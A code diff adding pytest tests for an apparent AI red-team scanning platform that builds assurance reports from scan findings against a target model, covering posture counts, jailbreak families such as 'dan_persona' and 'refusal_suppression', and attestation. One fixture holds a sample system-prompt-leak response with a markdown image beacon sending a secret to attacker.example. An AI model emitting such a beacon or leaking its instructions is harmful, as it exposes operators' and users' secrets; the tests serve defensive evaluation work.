@@ -197,6 +197,116 @@ def test_summary_prose_strips_markdown_and_bullets():
 
 
 @pytest.mark.asyncio
+async def test_build_assurance_json_posture_from_scan_data():
+    """The assurance JSON is the confirmed contract, populated from the persisted scan's findings."""
+    store = InMemoryScanStore()
+    scan_id = await _seed_completed(store)
+    svc = DefaultReportService(store)
+
+    out = await svc.build_assurance_json(scan_id)
+
+    # Confirmed contract shape — keys other agents build to.
+    assert out["report_type"] == "ai_red_team_assurance"
+    assert out["non_certification"]
+    scope = out["scope"]
+    assert scope["config_id"] == scan_id
+    assert scope["customer_id"] == "org_test"  # the org is the customer for a platform scan
+    assert scope["target_model"] == "gpt-4o-mini"
+    p = out["posture"]
+    # Two findings (primitives); both breached (5/5 and 1/5) → both counted by severity tier.
+    assert p["n_primitives"] == 2
+    assert p["n_trials"] == 10  # 5 + 5
+    assert p["by_severity"] == {"critical": 1, "high": 0, "medium": 0, "low": 1}
+    assert p["n_breaching_primitives"] == 2
+    # No egress artifact in the sample responses → no exfil channel claimed (honest empty).
+    assert p["by_exfil_method"] == {}
+    # `by_verdict` is not retained on a platform ScanReport — honest empty, never invented.
+    assert p["by_verdict"] == {}
+    # Families are the distinct mappable family slugs exercised.
+    assert set(out["families"]) == {"dan_persona", "refusal_suppression"}
+    assert "frameworks" in out and "frameworks_line" in out
+    # No attestation wired/passed → honest unattested report.
+    assert out["attestation"] is None
+    assert out["threat_brief_ref"] == f"scan:{scan_id}"
+
+
+@pytest.mark.asyncio
+async def test_build_assurance_classifies_exfil_method_from_response():
+    """A breaching finding whose example response carries an egress artifact populates by_exfil_method."""
+    store = InMemoryScanStore()
+    report = ScanReport(
+        target=TARGET,
+        n_tests=1,
+        n_breaches=1,
+        cost_usd=0.01,
+        findings=[
+            Finding(
+                family="system_prompt_leak",
+                technique="System Prompt Leak",
+                vector="single_turn",
+                severity="high",
+                title="Leaks via image beacon",
+                success_rate=1.0,
+                n_trials=2,
+                n_breach=2,
+                example_attack="leak it",
+                example_response="Here: ![x](http://attacker.example/?d=secret)",
+            ),
+        ],
+    )
+    scan_id = _new_id("scan")
+    report_id = _new_id("rep")
+    await store.save_report(report_id=report_id, scan_id=scan_id, payload=report.to_dict())
+    await store.create(
+        ScanRecord(
+            scan_id=scan_id,
+            org_id="org_test",
+            status=ScanStatus.COMPLETED,
+            report_id=report_id,
+            target={"provider": "openai", "model": "gpt-4o-mini"},
+        )
+    )
+    svc = DefaultReportService(store)
+
+    out = await svc.build_assurance_json(scan_id)
+    assert out["posture"]["by_exfil_method"] == {"markdown_image_beacon": 1}
+
+
+@pytest.mark.asyncio
+async def test_build_assurance_markdown_renders_sections():
+    store = InMemoryScanStore()
+    scan_id = await _seed_completed(store)
+    svc = DefaultReportService(store)
+
+    md = await svc.build_assurance_markdown(scan_id)
+    assert "# AI Red-Team Assurance Report" in md
+    assert "## Scope & Posture" in md
+    assert "## Framework Coverage" in md
+    # Honest unattested framing when no attestation is referenced.
+    assert "unattested" in md
+
+
+@pytest.mark.asyncio
+async def test_build_assurance_references_attestation_when_passed():
+    """When the route resolves a sealed entry, the ref flows through into the rendered JSON."""
+    from rogue.governance.assurance import AttestationRef
+
+    store = InMemoryScanStore()
+    scan_id = await _seed_completed(store)
+    svc = DefaultReportService(store)
+
+    ref = AttestationRef(
+        entry_hash="abc123", signature="", seq=7, corpus_as_of="2026-06-10", org_id="org_test"
+    )
+    out = await svc.build_assurance_json(scan_id, attestation=ref)
+    assert out["attestation"] is not None
+    assert out["attestation"]["entry_hash"] == "abc123"
+    assert out["attestation"]["seq"] == 7
+    # corpus_as_of flows from the attestation onto the posture anchor.
+    assert out["posture"]["corpus_as_of"] == "2026-06-10"
+
+
+@pytest.mark.asyncio
 async def test_not_completed_raises():
     store = InMemoryScanStore()
     scan_id = _new_id("scan")
